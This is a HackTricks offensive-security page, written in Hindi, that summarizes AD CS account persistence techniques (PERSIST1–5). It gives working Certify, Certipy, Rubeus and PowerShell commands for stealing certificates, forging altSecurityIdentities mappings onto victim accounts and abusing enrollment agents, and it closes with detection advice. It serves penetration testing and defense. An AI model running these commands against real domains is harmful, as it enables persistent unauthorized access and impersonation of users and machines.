# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**यह [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) से शानदार शोध के खाते की स्थिरता अध्यायों का एक छोटा सारांश है।**

## Understanding Active User Credential Theft with Certificates – PERSIST1

एक परिदृश्य में जहां एक प्रमाणपत्र जो डोमेन प्रमाणीकरण की अनुमति देता है, एक उपयोगकर्ता द्वारा अनुरोध किया जा सकता है, एक हमलावर के पास इस प्रमाणपत्र को अनुरोध करने और चुराने का अवसर होता है ताकि नेटवर्क पर स्थिरता बनाए रखी जा सके। डिफ़ॉल्ट रूप से, Active Directory में `User` टेम्पलेट ऐसी अनुरोधों की अनुमति देता है, हालांकि इसे कभी-कभी अक्षम किया जा सकता है।

[Certify](https://github.com/GhostPack/Certify) या [Certipy](https://github.com/ly4k/Certipy) का उपयोग करके, आप सक्षम टेम्पलेट्स की खोज कर सकते हैं जो क्लाइंट प्रमाणीकरण की अनुमति देते हैं और फिर एक का अनुरोध कर सकते हैं:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
एक प्रमाणपत्र की शक्ति इस बात में निहित है कि यह उस उपयोगकर्ता के रूप में प्रमाणीकरण करने में सक्षम है, जिससे यह संबंधित है, भले ही पासवर्ड में परिवर्तन हो, जब तक कि प्रमाणपत्र मान्य है।

आप PEM को PFX में परिवर्तित कर सकते हैं और इसका उपयोग TGT प्राप्त करने के लिए कर सकते हैं:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> नोट: अन्य तकनीकों के साथ मिलकर (देखें THEFT अनुभाग), प्रमाणपत्र-आधारित प्रमाणीकरण बिना LSASS को छुए और यहां तक कि गैर-उन्नत संदर्भों से स्थायी पहुंच की अनुमति देता है।

## प्रमाणपत्रों के साथ मशीन स्थिरता प्राप्त करना - PERSIST2

यदि एक हमलावर के पास एक होस्ट पर उन्नत विशेषाधिकार हैं, तो वे डिफ़ॉल्ट `Machine` टेम्पलेट का उपयोग करके समझौता किए गए सिस्टम के मशीन खाते के लिए एक प्रमाणपत्र के लिए नामांकन कर सकते हैं। मशीन के रूप में प्रमाणीकरण करने से स्थानीय सेवाओं के लिए S4U2Self सक्षम होता है और यह स्थायी होस्ट स्थिरता प्रदान कर सकता है:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Extending Persistence Through Certificate Renewal - PERSIST3

प्रमाणपत्र टेम्पलेट्स की वैधता और नवीनीकरण अवधि का दुरुपयोग एक हमलावर को दीर्घकालिक पहुंच बनाए रखने की अनुमति देता है। यदि आपके पास एक पूर्व में जारी किया गया प्रमाणपत्र और इसका निजी कुंजी है, तो आप इसे समाप्ति से पहले नवीनीकरण कर सकते हैं ताकि बिना मूल प्रिंसिपल से जुड़े अतिरिक्त अनुरोध कलाकृतियों को छोड़े एक नया, दीर्घकालिक क्रेडेंशियल प्राप्त कर सकें।
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> संचालन संबंधी टिप: हमलावर-धारित PFX फ़ाइलों पर जीवनकाल को ट्रैक करें और जल्दी नवीनीकरण करें। नवीनीकरण से अपडेटेड प्रमाणपत्रों में आधुनिक SID मैपिंग एक्सटेंशन शामिल हो सकता है, जिससे वे सख्त DC मैपिंग नियमों के तहत उपयोगी बने रहते हैं (अगले अनुभाग को देखें)।

## स्पष्ट प्रमाणपत्र मैपिंग लगाना (altSecurityIdentities) – PERSIST4

यदि आप एक लक्षित खाते के `altSecurityIdentities` विशेषता में लिख सकते हैं, तो आप उस खाते के लिए एक हमलावर-नियंत्रित प्रमाणपत्र को स्पष्ट रूप से मैप कर सकते हैं। यह पासवर्ड परिवर्तनों के पार स्थायी रहता है और, जब मजबूत मैपिंग प्रारूपों का उपयोग किया जाता है, तो आधुनिक DC प्रवर्तन के तहत कार्यात्मक बना रहता है।

उच्च-स्तरीय प्रवाह:

1. एक क्लाइंट-प्रमाणित प्रमाणपत्र प्राप्त करें या जारी करें जिसे आप नियंत्रित करते हैं (जैसे, `User` टेम्पलेट के रूप में स्वयं को नामांकित करें)।
2. प्रमाणपत्र से एक मजबूत पहचानकर्ता निकालें (Issuer+Serial, SKI, या SHA1-PublicKey)।
3. उस पहचानकर्ता का उपयोग करके पीड़ित प्रमुख के `altSecurityIdentities` पर एक स्पष्ट मैपिंग जोड़ें।
4. अपने प्रमाणपत्र के साथ प्रमाणीकरण करें; DC इसे स्पष्ट मैपिंग के माध्यम से पीड़ित के साथ मैप करता है।

उदाहरण (PowerShell) एक मजबूत Issuer+Serial मैपिंग का उपयोग करते हुए:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
फिर अपने PFX के साथ प्रमाणीकरण करें। Certipy सीधे TGT प्राप्त करेगा:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
```
Notes
- केवल मजबूत मैपिंग प्रकारों का उपयोग करें: X509IssuerSerialNumber, X509SKI, या X509SHA1PublicKey। कमजोर प्रारूप (Subject/Issuer, केवल Subject, RFC822 ईमेल) अप्रचलित हैं और DC नीति द्वारा अवरुद्ध किए जा सकते हैं।
- प्रमाणपत्र श्रृंखला को DC द्वारा विश्वसनीय एक रूट पर बनाना चाहिए। NTAuth में एंटरप्राइज CA आमतौर पर विश्वसनीय होते हैं; कुछ वातावरण सार्वजनिक CA को भी विश्वसनीय मानते हैं।

कमजोर स्पष्ट मैपिंग और हमले के रास्तों के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

यदि आप एक मान्य प्रमाणपत्र अनुरोध एजेंट/एनरोलमेंट एजेंट प्रमाणपत्र प्राप्त करते हैं, तो आप इच्छानुसार उपयोगकर्ताओं की ओर से नए लॉगिन-सक्षम प्रमाणपत्र बना सकते हैं और एजेंट PFX को ऑफ़लाइन एक स्थायी टोकन के रूप में रख सकते हैं। दुरुपयोग कार्यप्रवाह:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
एजेंट प्रमाणपत्र या टेम्पलेट अनुमतियों की निरस्तीकरण इस स्थायीता को समाप्त करने के लिए आवश्यक है।

## 2025 मजबूत प्रमाणपत्र मैपिंग प्रवर्तन: स्थायीता पर प्रभाव

Microsoft KB5014754 ने डोमेन नियंत्रकों पर मजबूत प्रमाणपत्र मैपिंग प्रवर्तन पेश किया। 11 फरवरी, 2025 से, DCs डिफ़ॉल्ट रूप से पूर्ण प्रवर्तन पर हैं, कमजोर/अस्पष्ट मैपिंग को अस्वीकार करते हैं। व्यावहारिक निहितार्थ:

- 2022 से पहले के प्रमाणपत्र जो SID मैपिंग एक्सटेंशन की कमी रखते हैं, पूर्ण प्रवर्तन में DCs के दौरान अप्रत्यक्ष मैपिंग में विफल हो सकते हैं। हमलावर AD CS के माध्यम से प्रमाणपत्रों को नवीनीकरण करके (SID एक्सटेंशन प्राप्त करने के लिए) या `altSecurityIdentities` में एक मजबूत स्पष्ट मैपिंग लगाकर (PERSIST4) पहुंच बनाए रख सकते हैं।
- मजबूत प्रारूपों (Issuer+Serial, SKI, SHA1-PublicKey) का उपयोग करते हुए स्पष्ट मैपिंग काम करना जारी रखती है। कमजोर प्रारूप (Issuer/Subject, Subject-only, RFC822) को अवरुद्ध किया जा सकता है और इसे स्थायीता के लिए टाला जाना चाहिए।

प्रशासकों को निम्नलिखित पर निगरानी और अलर्ट करना चाहिए:
- `altSecurityIdentities` में परिवर्तन और नामांकन एजेंट और उपयोगकर्ता प्रमाणपत्रों के जारी करने/नवीनीकरण।
- CA जारी करने के लॉग पर प्रतिनिधित्व अनुरोधों और असामान्य नवीनीकरण पैटर्न के लिए।

## संदर्भ

- Microsoft. KB5014754: Windows डोमेन नियंत्रकों पर प्रमाणपत्र-आधारित प्रमाणीकरण में परिवर्तन (प्रवर्तन समयरेखा और मजबूत मैपिंग)।
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy Wiki – कमांड संदर्भ (`req -renew`, `auth`, `shadow`)।
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference

{{#include ../../../banners/hacktricks-training.md}}
